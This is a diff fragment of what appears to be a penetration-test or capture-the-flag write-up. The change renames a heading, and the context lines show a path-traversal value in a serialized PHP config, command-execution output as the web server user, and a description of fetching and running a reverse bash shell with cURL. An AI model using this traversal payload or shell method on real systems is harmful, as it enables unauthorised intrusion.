@@ -206,7 +206,7 @@ a:13:{s:7:"php_dir";s:88:"/&locale=../../../../../usr/share/php/PEAR&namespace=p
 
 This proves successful, and the output displays: uid=474(wwwrun) gid=477(www) groups=477(www).
 
-### Getting a shell
+### Obtaining a shell
 
 To obtain access we will set up a listener on our attacker machine before using a cURL payload to download a reverse bash shell onto the server, execute it, and catch the session on our listener. 
 
